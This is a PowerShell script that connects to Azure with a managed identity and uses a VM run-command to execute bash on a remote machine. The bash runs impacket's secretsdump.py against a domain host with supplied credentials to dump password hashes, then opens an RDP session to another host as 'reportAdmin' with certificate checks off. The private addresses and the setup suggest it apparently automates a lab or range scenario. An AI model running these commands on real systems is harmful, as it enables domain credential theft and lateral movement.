param (
    [string]$adminPassword,
    [string]$vmName,
    [string]$resourceGroupName
)

Import-Module Az.Compute
Import-Module Az.Accounts

# The sliced subscription appears with a delay, so wait for a usable context: Connect-AzAccount can
# hit its 100s HttpClient timeout and return nothing while the sign-in later succeeds.
$connectDeadline = (Get-Date).AddMinutes(6)
do {
    Connect-AzAccount -Identity -ErrorAction SilentlyContinue | Out-Null
    $context = Get-AzContext
    if ($context.Subscription.Id) { break }
    Start-Sleep -Seconds 15
} while ((Get-Date) -lt $connectDeadline)
if (-not $context.Subscription.Id) { throw "No Azure context after Connect-AzAccount -Identity." }

$Command = @"
#!/bin/bash
sudo /root/.local/bin/secretsdump.py 'ODOMAIN/ssupport:$adminPassword'@10.0.0.5
su - adm0 -c 'whoami'
su - adm0 -c 'DISPLAY=:99 timeout 90 xfreerdp /v:10.0.0.4 /u:reportAdmin /p:'$adminPassword' /dynamic-resolution /cert:ignore &'
"@


$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $vmName -CommandId "RunShellScript" -ScriptString $Command
# View the full output

$output.Value | ForEach-Object { $_.Message }

